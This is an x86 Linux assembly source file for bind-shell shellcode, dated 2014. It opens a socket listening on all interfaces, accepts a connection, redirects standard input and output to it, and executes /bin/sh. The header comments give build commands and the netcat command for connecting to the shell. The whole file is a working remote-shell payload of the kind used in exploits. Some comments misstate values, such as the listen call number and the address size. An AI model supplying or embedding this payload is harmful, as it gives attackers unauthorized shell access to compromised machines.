#
#   bind ip:port 0.0.0.0:0x2211
#   get shell by "nc 127.0.0.1 8721"   
#
#   
#   as -o bind.o bind.s && ld -o bind bind.o || echo compile error
#
#	Random

.set port,0x1122        #port =  0x2211  it's net order not host order that 0x1122 represents 0x2211

.text 
.global _start 
_start: 

#init
xor  %eax,%eax 
xor  %ebx,%ebx 
xor  %ecx,%ecx 
xor  %edx,%edx 

#**** socket(PF_INET, SOCK_STREAM, IPPROTO_IP) ****#
#sys_socketcall(SYS_SOCKET,_user void* data)
push %eax
push $1
push $2
mov  %esp,%ecx      #(_user void* data)  for sockcall
movb $1,%bl         #bl = 1 = SYS_SOCKET
movb $0x66,%al      #socketcall,0x66=102
int  $0x80          
mov  %eax,%esi
add  $0x0c, %esp


#**** bind(sockfd,struct sock_addr*,socket_len) ****#
#sys_socketcall(SYS_BIND,_user void* data)
#sock_addr contain 16 bytes, 2 bytes for sa_family
xor   %edx,%edx
push  %edx          # 16 bytes unused
push  %edx
push  %edx          # ip = ADDR_ANY = 0.0.0.0         ,4 bytes (net order)
pushw $port         # port
movb  $0x02,%dl     # sa_family = 2 = AF_INET   ,2 bytes
pushw %dx
movl  %esp,%ecx     

push  $0x10         #sizeof(SOCK_ADDR) = 0x16
push  %ecx          #struct sock_addr*
push  %esi          #sockfd
mov   %esp,%ecx     #(_user void* data)  for sockcall
inc   %bl           #bl= 2 = SYS_BIND
mov   $0x66,%al     #socketcall
int   $0x80           
add   $0x1C, %esp




#**** listen(sockfd,max_conn) ****#
#sys_socketcall(SYS_LISTEN,_user void* data)
movb  $10, %dl      #edx = max_conn = 10
push %edx          
push %esi           #sockfd
mov  %esp,%ecx      #(_user void* data)  for sockcall
mov  $0x4,%bl       #bl= 10 = SYS_LISTEN 
mov  $0x66,%al      #socketcall
int  $0x80         
add  $0x08, %esp    

#**** accept(sockfd, struct sock_addr*, socket_len*) ****#
#sys_socketcall(SYS_ACCEPT,_user void* data)
sub  $0x04, %esp
mov  %esp,%edx
sub  $0x10, %esp
mov  %esp,%ecx
push %edx
push %ecx                     
push %esi           
mov  %esp,%ecx      #(_user void* data)  for sockcall
xor  %ebx,%ebx
movb $0x05,%bl      #bl= 5 = SYS_ACCEPT    
mov  $0x66,%al      #socketcall
int  $0x80         
add  $0x20,%esp


#**** dup2(oldfd, newfd=0) ****#
mov  %eax,%ebx     #connfd = eax
xor  %ecx,%ecx     #ecx = 0 = STDIN_FILENO
mov  $0x3f,%al     #dup2 0x3f=63
int  $0x80         
#dup2(oldfd, newfd=1)
inc  %ecx          #ecx = 1 = STDOUT_FILENO
mov  $0x3f,%al 
int  $0x80 
#dup2(oldfd, newfd=2)
inc  %ecx          #ecx = 2 = STDOUT_FILENO
mov  $0x3f,%al     #dup2
int  $0x80 


#**** execve(char *file, char **args, char** env) ****#
xor  %edx,%edx
push %edx           #null
push $0x68732f2f    #//sh
push $0x6e69622f    #/bin 
mov  %esp,%ebx 
push %edx 
push %ebx 
mov  %esp ,%ecx
mov  $0xb,%al      #execve
int  $0x80 
add  $0x14,%esp

#exit(0)
xor %eax,%eax
xor %ebx,%ebx
inc %eax            #exit
int $0x80           


#:) random  2014-04-20

